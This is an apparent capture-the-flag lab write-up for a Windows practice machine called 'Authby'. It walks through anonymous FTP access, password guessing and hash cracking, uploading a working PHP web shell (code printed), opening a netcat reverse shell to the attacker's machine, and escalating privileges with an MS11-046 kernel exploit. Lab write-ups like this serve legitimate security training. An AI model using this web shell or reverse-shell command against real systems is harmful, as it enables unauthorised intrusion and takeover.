---
Alias: Authby
Date: 6/22/22
Platform: Windows
Difficulty: Intermediate
Tags: #simplephpbackdoorRCE #MS11-046 #.htaccess #rootdirectorylocationsWWW #rootdirectorylocationsHTDOCS #rootdirectorylocationsPUBLIC_HTML
Status: Finished
IP: 192.168.100.46
---

# {{Authby}}


# Resolution summary
- Logged into FTP server anonymously and retreived a username
- Guessed password for found user to gain access to users ftp server
- Located username and hashed password
- Found the ftp directory was in the root directory of wordpress site
- Utilized john to crack the users hashed password
- Accessed found login page on port 242
- Uploaded a simple php backdoor script in the FTP server within the root directory of wordpress site
- Confirmed RCE
- Uploaded netcat binary to FTP server 
- Received a command prompt running as 
- Found system was not patched for vulnerability MS11-046 
- Transferred compiled MS11-046 binary onto the system and received a CMD running as nt authority\system

## Improved skills
- Password guessing
- Learned an .htaccess file is located within the root directory of wordpress sites. 
- Learned (depending on the hosting provider) the root directory may be a folder labeled public_html, www, htdocs or httpdocs

## Used tools
- rustscan
- john

---

# Information Gathering
Scanned all TCP ports:
```bash
ustscan -a 192.168.100.46 --ulimit 5000                                                                                       (master✱) 
.----. .-. .-. .----..---.  .----. .---.   .--.  .-. .-.
| {}  }| { } |{ {__ {_   _}{ {__  /  ___} / {} \ |  `| |
| .-. \| {_} |.-._} } | |  .-._} }\     }/  /\  \| |\  |
`-' `-'`-----'`----'  `-'  `----'  `---' `-'  `-'`-' `-'
The Modern Day Port Scanner.
________________________________________
: https://discord.gg/GFrQsGy           :
: https://github.com/RustScan/RustScan :
 --------------------------------------
Nmap? More like slowmap.🐢

[~] The config file is expected to be at "/home/kali/.rustscan.toml"
[~] Automatically increasing ulimit value to 5000.
Open 192.168.100.46:21
Open 192.168.100.46:242
Open 192.168.100.46:3145
Open 192.168.100.46:3389
[~] Starting Script(s)
[>] Script to be run Some("nmap -vvv -p {{port}} {{ip}}")

[~] Starting Nmap 7.92 ( https://nmap.org ) at 2022-06-16 14:38 EDT
Initiating Ping Scan at 14:38
Scanning 192.168.100.46 [2 ports]
Completed Ping Scan at 14:38, 3.00s elapsed (1 total hosts)
Nmap scan report for 192.168.100.46 [host down, received no-response]
Read data files from: /usr/bin/../share/nmap
Note: Host seems down. If it is really up, but blocking our ping probes, try -Pn
Nmap done: 1 IP address (0 hosts up) scanned in 3.09 seconds


sudo nmap -sC -sV -O 192.168.100.46 -p 21,242,3145,3389                                                                        (master✱) 
Starting Nmap 7.92 ( https://nmap.org ) at 2022-06-16 17:55 EDT
Nmap scan report for 192.168.100.46
Host is up (0.080s latency).

PORT     STATE SERVICE            VERSION
21/tcp   open  ftp                zFTPServer 6.0 build 2011-10-17
| ftp-anon: Anonymous FTP login allowed (FTP code 230)
| total 9680
| ----------   1 root     root      5610496 Oct 18  2011 zFTPServer.exe
| ----------   1 root     root           25 Feb 10  2011 UninstallService.bat
| ----------   1 root     root      4284928 Oct 18  2011 Uninstall.exe
| ----------   1 root     root           17 Aug 13  2011 StopService.bat
| ----------   1 root     root           18 Aug 13  2011 StartService.bat
| ----------   1 root     root         8736 Nov 09  2011 Settings.ini
| dr-xr-xr-x   1 root     root          512 Jun 17 01:38 log
| ----------   1 root     root         2275 Aug 08  2011 LICENSE.htm
| ----------   1 root     root           23 Feb 10  2011 InstallService.bat
| dr-xr-xr-x   1 root     root          512 Nov 08  2011 extensions
| dr-xr-xr-x   1 root     root          512 Nov 08  2011 certificates
|_dr-xr-xr-x   1 root     root          512 Sep 22  2021 accounts
242/tcp  open  http               Apache httpd 2.2.21 ((Win32) PHP/5.3.8)
| http-auth: 
| HTTP/1.1 401 Authorization Required\x0D
|_  Basic realm=Qui e nuce nuculeum esse volt, frangit nucem!
|_http-title: 401 Authorization Required
|_http-server-header: Apache/2.2.21 (Win32) PHP/5.3.8
3145/tcp open  zftp-admin         zFTPServer admin
3389/tcp open  ssl/ms-wbt-server?
| rdp-ntlm-info: 
|   Target_Name: LIVDA
|   NetBIOS_Domain_Name: LIVDA
|   NetBIOS_Computer_Name: LIVDA
|   DNS_Domain_Name: LIVDA
|   DNS_Computer_Name: LIVDA
|   Product_Version: 6.0.6001
|_  System_Time: 2022-06-16T21:56:29+00:00
|_ssl-date: 2022-06-16T21:56:35+00:00; 0s from scanner time.
| ssl-cert: Subject: commonName=LIVDA
| Not valid before: 2022-06-15T12:28:44
|_Not valid after:  2022-12-15T12:28:44
Warning: OSScan results may be unreliable because we could not find at least 1 open and 1 closed port
Aggressive OS guesses: Microsoft Windows Server 2008 R2 (91%), Microsoft Windows Server 2008 R2 SP1 or Windows 8 (91%), Microsoft Windows 7 Professional or Windows 8 (91%), Microsoft Windows 7 SP1 or Windows Server 2008 SP2 or 2008 R2 SP1 (91%), Microsoft Windows Vista SP0 or SP1, Windows Server 2008 SP1, or Windows 7 (91%), Microsoft Windows Vista SP2 (91%), Microsoft Windows Vista SP2, Windows 7 SP1, or Windows Server 2008 (90%), Microsoft Windows 8.1 Update 1 (90%), Microsoft Windows Phone 7.5 or 8.0 (90%), Microsoft Windows 7 or Windows Server 2008 R2 (90%)
No exact OS matches for host (test conditions non-ideal).
Service Info: OS: Windows; CPE: cpe:/o:microsoft:windows

OS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 46.24 seconds

```

Enumerated open TCP ports:
```bash
21
242
```

Enumerated top 200 UDP ports:
```bash

```

---

# Enumeration
## Port 21

#### -Logged in to FTP as anonymous and found user admin listed in "accounts":

![](../Images/Pasted%20image%2020220617022948.png)

#### -Attempted to login via FTP as username "admin" and password "admin" and found the following files and then downloaded them to my kali machine:

![](../Images/Pasted%20image%2020220617023326.png)

#### -Cat'd ".htpasswd" file and found the following "offsec" user and the hashed password:

![](../Images/Pasted%20image%2020220617024410.png)

#### - Cat'd ".htaccess" and found:

![](../Images/Pasted%20image%2020220617231256.png)

#### -Googled "what is a .htaccess file" and found it is located in a root directory:

![](../Images/Pasted%20image%2020220617232242.png)

#### -Typed "john hash.txt --wordlist=/usr/share/wordlists/rockyou.txt" to crack the hash and password "elite" was received:

![](../Images/Pasted%20image%2020220617024646.png)

## Port 242

#### -Navigated to "http://192.168.100.46:242" and required a login. Input the found user "offsec" and password "elite" andwas able to login showing the following webpage:

![](../Images/Pasted%20image%2020220617222348.png)

![](../Images/Pasted%20image%2020220617222519.png)


---

# Exploitation
## Simple PHP Backdoor RCE

## Port 21

#### -Per my previous findings of the .htaccess file being located in a root directory. I created a file named "simplephpbackdoor.php" with the folowing contents on my kali machine:

<?php if(isset($_REQUEST['cmd'])){ echo "<pre>"; $cmd = ($_REQUEST['cmd']); system($cmd); echo "</pre>"; die; }?>

#### Logged into ftp with credentials user "admin" password "admin"

#### -Uploaded "simplephpbackdoor.php" 

![](../Images/Pasted%20image%2020220617234041.png)

## Port 242

#### -Navigated to "http://192.168.69.46:242/simplephpbackdoor.php" and a blank page came up

#### -Navigated to "http://192.168.69.46:242/simplephpbackdoor.php?cmd=dir" and found we had remote code execution:

![](../Images/Pasted%20image%2020220617234709.png)

#simplephpbackdoorRCE

#### -Typed "locate nc.exe" on kali machine and typed "cp /usr/share/windows-resources/binaries/nc.exe ." to copy the nc.exe binary into kali machine home directory:

![](../Images/Pasted%20image%2020220618183102.png)

#### -Typed "ftp 192.168.69.46" and logged in with user admin and password admin

#### -Typed "put nc.exe" to place nc.exe binary in root directory of target machine
#nc.exeBinaryDownload

#### -Started netcat listener on kali machine listening on port 3145

#### -Navigated to "http://192.168.69.46:242/simplephpbackdoor.php?cmd=nc.exe [kali machine IP] 3145 -e cmd" and received a command prompt:

![](../Images/Pasted%20image%2020220618184046.png)


---

# Privilege Escalation
## Local Enumeration

#### -Typed "systeminfo" and found the found the machine was running Windows Server 2008 with no hot fixes/patches installed:

Host Name:                 LIVDA
OS Name:                   Microsoftr Windows Serverr 2008 Standard 
OS Version:                6.0.6001 Service Pack 1 Build 6001
OS Manufacturer:           Microsoft Corporation
OS Configuration:          Standalone Server
OS Build Type:             Multiprocessor Free
Registered Owner:          Windows User
Registered Organization:   
Product ID:                92573-OEM-7502905-27565
Original Install Date:     12/19/2009, 11:25:57 AM
System Boot Time:          6/22/2022, 2:20:04 PM
System Manufacturer:       VMware, Inc.
System Model:              VMware Virtual Platform
System Type:               X86-based PC
Processor(s):              1 Processor(s) Installed.
                           [01]: x64 Family 23 Model 1 Stepping 2 AuthenticAMD ~3094 Mhz
BIOS Version:              Phoenix Technologies LTD 6.00, 11/12/2020
Windows Directory:         C:\Windows
System Directory:          C:\Windows\system32
Boot Device:               \Device\HarddiskVolume1
System Locale:             en-us;English (United States)
Input Locale:              en-us;English (United States)
Time Zone:                 (GMT-08:00) Pacific Time (US & Canada)
Total Physical Memory:     2,047 MB
Available Physical Memory: 1,659 MB
Page File: Max Size:       1,983 MB
Page File: Available:      1,542 MB
Page File: In Use:         441 MB
Page File Location(s):     N/A
Domain:                    WORKGROUP
Logon Server:              N/A
Hotfix(s):                 N/A
Network Card(s):           N/A

#KernalExploitPrivilegeEscalation


#### -Googled "6.0.6001 Service Pack 1 Build 6001 exploit"  and found the following webpage with exploit MS11-046:

![](../Images/Pasted%20image%2020220622211042.png)

![](../Images/Pasted%20image%2020220622211403.png)

#### -As the exploit show above was not already precompiled I navigated to "https://github.com/SecWiki/windows-kernel-exploits" as the webpage had a precompiled MS11-046 exploit:

![](../Images/Pasted%20image%2020220622211928.png)

![](../Images/Pasted%20image%2020220622220507.png)

#### -Downloaded the complied MS11-046 exploit to my kali machine


## Privilege Escalation vector
## MS11-046

#### -Transferred MS11-046 exploit to the target machine

#### -Typed "ms11-046.exe" and received a command prompt running as nt authority\system:

![](../Images/Pasted%20image%2020220622222108.png)
![](../Images/Pasted%20image%2020220622221842.png)
